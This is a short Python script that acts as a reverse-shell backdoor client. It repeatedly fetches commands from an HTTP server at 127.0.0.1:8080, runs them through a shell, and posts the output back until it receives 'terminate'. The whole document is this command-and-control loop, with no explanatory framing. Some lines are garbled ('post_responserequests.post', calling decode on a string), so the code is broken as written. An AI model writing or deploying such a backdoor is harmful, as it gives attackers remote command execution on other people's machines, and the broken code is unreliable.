import requests
import subprocess
import time

while True:
    req = requests.get('http://127.0.0.1:8080')
    command = req.text

    if 'terminate' in command:
        break
    else:
        cmd = subprocess.Popen(command.decode(),shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        post_responserequests.post(url = 'http://127.0.0.1:8080', data = cmd.stdout.read())
        post_responserequests.post(url = 'http://127.0.0.1:8080', data = cmd.stderr.read())
    time.sleep(3)
